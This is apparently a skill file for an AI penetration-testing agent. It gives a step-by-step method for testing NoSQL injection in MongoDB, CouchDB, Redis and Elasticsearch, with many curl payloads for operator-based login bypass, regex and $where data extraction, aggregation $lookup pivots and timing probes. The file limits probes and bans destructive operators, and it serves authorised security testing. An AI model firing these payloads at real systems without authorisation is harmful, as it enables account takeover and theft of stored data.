---
name: nosql-injection
description: Test NoSQL injection in MongoDB, Redis, and CouchDB through operator, type-confusion, authentication, timing, and extraction probes
origin: RedteamOpencode
---

# NoSQL Injection

## When to Activate

- A JSON, form, query, cookie, or header value selects MongoDB/CouchDB records or reaches Redis key/value logic
- A JSON login endpoint, filter API, or identifier behaves differently for operators, arrays, numbers, or malformed objects

## Tools

`run_tool curl`, `run_tool nosqlmap`, `run_tool sqlmap`, `run_tool redis-cli`.

## Methodology

### 1. Map the Injection Surface
Identify the parser, backend, and safe test object. Save the baseline request, auth context, status, body, headers, and latency. Keep scalar/array and string/integer controls; the analyst owns one or two bounded probes per family.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":"probe"}'
```

### 2. Inject JSON Operators
Replace one scalar with one operator object. Test `$ne`, `$gt`, `$exists`, `$regex`, `$where`, and `$or` independently; do not combine operators until the parser behavior is known.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$ne":null}}' # auth-shape probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$gt":""}}' # boundary probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$exists":true}}' # presence probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":{"$regex":"^a"}}' # anchored regex probe
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"probe","$or":[{"username":"probe"},{"username":{"$ne":""}}]}' # logical-operator probe
```

### 2b. URL-Encoded / Form-Body Operator Injection
Many backends only strip operators from JSON bodies but leave `application/x-www-form-urlencoded` bracket-array parsing (PHP `$_POST`, some Express `qs`/`body-parser` configs) untouched — this reaches the same Mongo driver without ever sending a raw JSON object.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -d 'username=probe&password[$ne]=1'                       # PHP-array-style operator via form body
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -d 'username[$regex]=^adm&password[$ne]=1'                # combine field-enumeration with auth-bypass
run_tool curl -sS --connect-timeout 5 --max-time 20 "$SEARCH_URL?filter[\$gt]="                # query-string bracket operator on GET
```

### 2c. Aggregation Pipeline Injection
If the app exposes a MongoDB aggregation-based filter/report endpoint (`$lookup`, `$match`, `$group` built from user input), operator injection can pivot into cross-collection joins that leak data outside the queried collection.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" -H 'Content-Type: application/json' \
  --data '{"match":{"$or":[{"_id":{"$exists":true}}]},"lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"leak"}}'
```
Treat any pipeline stage name (`$lookup`, `$unionWith`, `$merge`, `$out`) reachable from user input as a high-severity finding on its own — `$merge`/`$out` can write attacker-controlled data into another collection.

### 3. Test Type Confusion
Compare array versus scalar and integer versus string. MongoDB, CouchDB, and Redis may coerce or reject each shape differently; a backend-specific result is not a universal bypass.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":["probe"],"password":["probe"]}' # array shape
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"1","password":1}' # integer scalar
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' \
  --data '{"username":"1","password":"1"}' # string control
```

### 4. Check JSON Authentication Bypass
Use only a known JSON login endpoint and a harmless account name. Treat a 200, redirect, cookie, or token as a signal; repeat against an unknown user and a valid/invalid control before escalating.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" \
  -H 'Content-Type: application/json' -c "$DIR/scans/nosql-cookies.txt" \
  --data '{"username":"invalid","password":{"$ne":null}}' \
  -D "$DIR/scans/nosql-login-ne.headers" \
  -o "$DIR/scans/nosql-login-ne.json"
```

If Redis is explicitly in scope, use only read-only `TYPE` and `GET` probes. If `redis-cli` is absent, use the `run_tool curl` application probes above and record the direct Redis surface as untested.

```bash
run_tool redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" --raw TYPE "$REDIS_KEY"
run_tool redis-cli -h "$REDIS_HOST" -p "$REDIS_PORT" --raw GET "$REDIS_KEY"
```

### 5. Extract with Bounded Regex
Use an anchored, short prefix and paired character classes. Start with one character, stop on the first response difference, and never scan a large collection with an unbounded pattern.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" \
  -H 'Content-Type: application/json' \
  --data '{"filter":{"$regex":"^[a-m]"}}' # lower-half class
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$FILTER_URL" \
  -H 'Content-Type: application/json' \
  --data '{"filter":{"$regex":"^[n-z]"}}' # upper-half class
```

### 6. Use Timing Carefully
Use `$where` only for one short sleep comparison. Measure a normal request and one `sleep(2000)` request, then stop; do not infer extraction from an ordinary timeout.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
  -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","password":"probe"}'
run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'TIME=%{time_total}\n' \
  -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","$where":"sleep(2000)"}' # sleep-only timing probe
```

### 6b. `$where` / `mapReduce` JavaScript Injection (beyond timing)
Where `$where` or `mapReduce` reaches raw JS execution inside the Mongo server context, a confirmed timing signal (step 6) can sometimes escalate to data exfiltration through the same channel — still bounded to one or two probes, never a scripted extraction loop here (hand that to `exploit-developer`).

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","$where":"this.username==this.username"}'  # tautology confirms $where reaches server-side JS eval
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' \
  --data '{"username":"probe","$where":"function(){return this.password.match(/^a/)}"}'  # boolean-extraction primitive, confirm signal only
```

### 6c. Non-Mongo Backends: CouchDB Mango & Elasticsearch/OpenSearch DSL
Treat these as distinct engines with their own operator injection surface when the target's stack uses them instead of/alongside MongoDB.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$COUCHDB_URL/_find" -H 'Content-Type: application/json' \
  --data '{"selector":{"username":{"$eq":"probe"},"password":{"$gt":null}}}'   # CouchDB Mango selector, same $gt/$ne family
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$ES_URL/_search" -H 'Content-Type: application/json' \
  --data '{"query":{"query_string":{"query":"username:probe AND password:*"}}}' # Elasticsearch query_string operator injection if user input reaches Lucene syntax unescaped
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$ES_URL/_search" -H 'Content-Type: application/json' \
  --data '{"script_fields":{"x":{"script":{"source":"1==1"}}}}'                # confirm whether user input can reach `script.source` (RCE-class if scripting is enabled and input is unsanitized)
```

### 7. Run Bounded Tool Fallbacks
Use `nosqlmap` only when present, against one endpoint and one parameter. Use the `run_tool curl` fallback inline if it is missing; use `sqlmap` with MongoDB mode as a secondary check, not as sole proof.

```bash
run_tool nosqlmap -u "$LOGIN_URL" --method POST --data='username=probe&password[$ne]=' --batch --level 2 --risk 1
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$LOGIN_URL" -H 'Content-Type: application/json' --data '{"username":"probe","password":{"$ne":null}}'
run_tool sqlmap -u "$LOGIN_URL" --method POST --data='{"username":"probe","password":{"$ne":null}}' --dbms=mongodb --batch --level 2 --risk 1
```

### 8. Guard and Escalate
Reject catastrophic `$regex` backtracking (ReDoS), including nested or ambiguous quantifiers such as `(a+)+$`; cap prefix length and stop on latency or errors. Never use `$where` beyond the sleep probe, and never send `drop`, `delete`, collection writes, server-side evaluation, or other destructive operators. Capture status, body, cookies, headers, errors, and latency. Escalate repeatable authentication bypass or extraction to `exploit-developer`; keep this stage to one or two probes per family.

## References

`references/payloads/nosql-injection-payloads.md`, `references/payloads/sqli-payloads.md`, `references/vuln-checklists/A05-injection.md`, `references/tools/recon/curl.md`.
